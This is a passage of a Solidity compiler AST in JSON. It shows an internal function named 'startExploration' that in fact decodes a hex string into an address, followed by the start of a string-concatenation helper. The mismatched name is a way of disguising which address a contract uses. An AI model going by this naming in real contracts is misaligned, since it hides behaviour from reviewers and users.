																				}
																			}
																		],
																		"id": 536,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "4126:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 539,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 537,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 427,
																					"src": "4141:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 538,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "4147:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "4141:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 540,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "4140:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "4126:24:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 555,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 549,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 547,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 427,
																						"src": "4185:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 548,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "4191:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "4185:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 550,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "4184:10:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 553,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 551,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 427,
																						"src": "4199:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 552,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "4205:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "4199:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 554,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "4198:10:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "4184:24:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 561,
																	"nodeType": "IfStatement",
																	"src": "4180:52:3",
																	"trueBody": {
																		"id": 560,
																		"nodeType": "Block",
																		"src": "4210:22:3",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 558,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 556,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 427,
																						"src": "4217:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 557,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "4223:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "4217:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 559,
																				"nodeType": "ExpressionStatement",
																				"src": "4217:8:3"
																			}
																		]
																	}
																},
																"id": 562,
																"nodeType": "IfStatement",
																"src": "4122:110:3",
																"trueBody": {
																	"id": 546,
																	"nodeType": "Block",
																	"src": "4152:22:3",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 544,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 542,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 427,
																					"src": "4159:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 543,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "4165:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "4159:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 545,
																			"nodeType": "ExpressionStatement",
																			"src": "4159:8:3"
																		}
																	]
																}
															},
															"id": 563,
															"nodeType": "IfStatement",
															"src": "4063:169:3",
															"trueBody": {
																"id": 532,
																"nodeType": "Block",
																"src": "4094:22:3",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 530,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 528,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 427,
																				"src": "4101:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 529,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "4107:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "4101:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 531,
																		"nodeType": "ExpressionStatement",
																		"src": "4101:8:3"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 571,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 564,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 420,
																	"src": "4237:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 569,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 567,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 565,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 424,
																					"src": "4247:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3136",
																					"id": 566,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "4252:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_16_by_1",
																						"typeString": "int_const 16"
																					},
																					"value": "16"
																				},
																				"src": "4247:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 568,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 427,
																				"src": "4257:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"src": "4247:12:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		}
																	],
																	"id": 570,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "4246:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "4237:23:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 572,
															"nodeType": "ExpressionStatement",
															"src": "4237:23:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 439,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 433,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 430,
														"src": "3771:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														},
														"id": 438,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 434,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3775:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"nodeType": "BinaryOperation",
														"operator": "+",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															},
															"id": 437,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "32",
																"id": 435,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3779:1:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"nodeType": "BinaryOperation",
															"operator": "*",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3230",
																"id": 436,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3783:2:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_20_by_1",
																	"typeString": "int_const 20"
																},
																"value": "20"
															},
															"src": "3779:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															}
														},
														"src": "3775:10:3",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														}
													},
													"src": "3771:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 574,
												"initializationExpression": {
													"assignments": [
														430
													],
													"declarations": [
														{
															"constant": false,
															"id": 430,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 574,
															"src": "3759:6:3",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 429,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "3759:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 432,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 431,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3768:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "3759:10:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 442,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 440,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 430,
															"src": "3787:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 441,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3792:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"src": "3787:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 443,
													"nodeType": "ExpressionStatement",
													"src": "3787:6:3"
												},
												"nodeType": "ForStatement",
												"src": "3754:512:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 577,
															"name": "iaddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 420,
															"src": "4285:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														],
														"id": 576,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "4277:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_$",
															"typeString": "type(address)"
														},
														"typeName": {
															"id": 575,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "4277:7:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 578,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4277:14:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"functionReturnParameters": 411,
												"id": 579,
												"nodeType": "Return",
												"src": "4270:21:3"
											}
										]
									},
									"documentation": null,
									"id": 581,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "startExploration",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 408,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 407,
												"mutability": "mutable",
												"name": "_a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 581,
												"src": "3599:16:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 406,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "3599:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3598:18:3"
									},
									"returnParameters": {
										"id": 411,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 410,
												"mutability": "mutable",
												"name": "_parsedAddress",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 581,
												"src": "3640:22:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 409,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3640:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3639:24:3"
									},
									"scope": 1047,
									"src": "3573:723:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 677,
										"nodeType": "Block",
										"src": "4400:445:3",
										"statements": [
											{
												"assignments": [
													591
												],
												"declarations": [
													{
														"constant": false,
														"id": 591,
														"mutability": "mutable",
														"name": "_baseBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 677,
														"src": "4405:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 590,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "4405:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 596,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 594,
															"name": "_base",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 583,
															"src": "4437:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 593,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "4431:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 592,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "4431:5:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 595,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4431:12:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4405:38:3"
											},
											{
												"assignments": [
													598
												],
												"declarations": [
													{
														"constant": false,
														"id": 598,
														"mutability": "mutable",
														"name": "_valueBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 677,
														"src": "4448:24:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 597,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "4448:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 603,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 601,
															"name": "_value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 585,
															"src": "4481:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 600,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "4475:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 599,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "4475:5:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 602,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4475:13:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4448:40:3"
											},
											{
												"assignments": [
													605
												],
												"declarations": [
													{
														"constant": false,
														"id": 605,
														"mutability": "mutable",
														"name": "_tmpValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 677,
														"src": "4495:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 604,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "4495:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 614,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 612,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 608,
																	"name": "_baseBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 591,
																	"src": "4532:10:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 609,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "4532:17:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "+",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 610,
																	"name": "_valueBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 598,
																	"src": "4552:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 611,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "4552:18:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "4532:38:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 607,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "4521:10:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														},
														"typeName": {
															"id": 606,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "4525:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														}
													},
													"id": 613,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4521:50:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4495:76:3"
											},
											{
												"assignments": [
													616
												],
												"declarations": [
													{
														"constant": false,
														"id": 616,
														"mutability": "mutable",
														"name": "_newValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 677,
														"src": "4576:22:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 615,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "4576:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 621,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 619,
															"name": "_tmpValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 605,
															"src": "4607:9:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 618,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "4601:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 617,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "4601:5:3",
															"typeDescriptions": {
